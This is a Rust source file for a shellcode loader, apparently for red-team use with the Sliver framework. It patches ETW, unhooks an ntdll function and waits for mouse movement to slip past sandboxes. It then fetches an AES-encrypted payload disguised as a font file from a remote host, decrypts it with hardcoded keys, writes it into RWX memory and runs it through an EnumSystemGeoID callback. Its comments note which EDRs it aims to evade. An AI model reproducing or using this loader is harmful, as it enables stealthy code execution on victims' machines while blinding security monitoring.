// Ref: https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/shellcode_callback_bin.nim
// Callback function to hold and execute shellcode
// This is a fun one. I like it a lot because how many EDRs are going to hook this random-ass API call? Good for self injection but does allocate as RWX so be careful.
//#![windows_subsystem = "windows"]
extern crate kernel32;
use winapi::um::winnt::{MEM_COMMIT,PAGE_EXECUTE_READWRITE};
use std::ptr;
use winapi::um::errhandlingapi;
use winapi::um::winnls::EnumSystemGeoID;
use winapi::um::winnls::{GEO_ENUMPROC};
use std::mem::transmute;

extern crate ntapi;
use ntapi::ntmmapi::{ NtAllocateVirtualMemory, NtWriteVirtualMemory };
use ntapi::ntpsapi::NtCurrentProcess;
use std::ptr::null_mut;
use ntapi::winapi::ctypes::c_void;

use std::io::stdout;
use std::io::stdin;
use std::io::Write;
use std::io::Read;
use std::any::type_name;

use libaes::Cipher;

// Bring in patch ETW func
mod etw;
use etw::patch_etw;

mod mouse;
use mouse::wait_for_mouse_movement;

use std::{thread, time};

#[macro_use]
extern crate litcrypt;

use_litcrypt!();

fn print_type_of<T>(_: &T) {
    println!("{}", std::any::type_name::<T>())
}

// Convinience proc for troubleshooting
fn breakpoint() {
    let mut stdout = stdout();
    stdout.write(b"[*] Press Enter to continue...\n").unwrap();
    stdout.flush().unwrap();
    stdin().read(&mut [0]).unwrap();
}

fn wait(time: u64) {
    println!("[i] Sleeping for {} seconds", time);
    thread::sleep(time::Duration::from_secs(time));
}

fn unhook_ntdll() {
    unsafe {
        println!("[+] Restoring Ntdll by patching 5 bytes ");

        let handle = kernel32::LoadLibraryA("ntdll\0".as_ptr() as *const i8);
        let mini = kernel32::GetProcAddress(handle, "NtClose\0".as_ptr() as *const i8);
        NtWriteVirtualMemory(NtCurrentProcess, mini as *mut c_void, b"\x4C\x8B\xD1\xB8\x0E".as_ptr() as *mut c_void, 5, null_mut());
    }
}

fn main() {

    println!("[+] Patching ETW...");

    patch_etw();    // 1st
    
    unhook_ntdll();
    
    println!("[+] Repatching ETW");

    patch_etw();    // 2nd
    
    callback_shellcode();

}

fn callback_shellcode() {

    // URL of the web request
    let url: String = lc!("http://example.com:8090/assets/fonts/FiraCode-Regular.woff");

    wait(5);

    // Make the web request and get the response
    let response = reqwest::blocking::get(url).expect("Failed to make web request");

    // Get the encrypted raw bytes from the response
    let encrypted_bytes = response.bytes().expect("Failed to read response bytes");


    // Fix Sliver encrypted stage
    let mut l: Vec<u8> = Vec::new();
    
    for i in 16..encrypted_bytes.len() {
        l.push(encrypted_bytes[i]);
    }
    let actual: Vec<u8> = l;    // adjusted byte array


    // Define the key and IV
    let key = b"2r5u8x/A?D*G-KaP";
    let iv = b"7x!A%D*G-KaPdSgV";


    // Decrypt the raw bytes using AES-128 CBC
    let shellcode = decrypt_aes_128_cbc(&actual, key, iv);

    unsafe{
        let curr_proc = kernel32::GetCurrentProcessId();

        println!("[+] Proc ID: {}", curr_proc.to_string());

        // Replacement
        let mut shellcode_len : usize = shellcode.len().try_into().unwrap();
        let mut base_addr : *mut c_void = null_mut();

        println!("[+] Allocating scode size of {}", shellcode_len.to_string());
        
        wait(2);

        NtAllocateVirtualMemory(NtCurrentProcess, &mut base_addr, 0, &mut shellcode_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        

        if base_addr.is_null() { 
            println!("[-] Couldn't allocate memory to current proc.")
        } else {
            println!("[+] Allocated memory to current proc.");
        }

        
        println!("[*] Copying scode to address in current proc.");
            
        wait(6);

        // Copy shellcode into mem
        // std::ptr::copy(shellcode.as_ptr() as  _, base_addr, shellcode.len());
        NtWriteVirtualMemory(NtCurrentProcess, base_addr,shellcode.as_ptr() as _, shellcode.len() as usize, null_mut());

        // breakpoint();

        // Perform callback function depending on user input
        println!("Waiting for mouse movement...");
        
        wait_for_mouse_movement();

        println!("[*] Executing callback function...");

        // Callback execution
        let res = EnumSystemGeoID(
            16,
            0,
            //transmute::<*mut std::ffi::c_void, GEO_ENUMPROC>(base_addr)
            transmute::<*mut winapi::ctypes::c_void, GEO_ENUMPROC>(base_addr)
        );
        
        // breakpoint();
        
        println!("Result: {}", res);

        if res > 0 {
                println!("[+] Good!")
            } else {
                let error = errhandlingapi::GetLastError();
                println!("{}", error.to_string())
            }
    }
}

fn decrypt_aes_128_cbc(encrypted_data: &[u8], key: &[u8; 16], iv: &[u8; 16]) -> Vec<u8> {
    // Create an AES-128 CBC cipher instance
    let cipher = Cipher::new_128(key);
    // Decrypt the data
    let decrypted_data = cipher.cbc_decrypt(iv, &encrypted_data[..]);

    decrypted_data
}



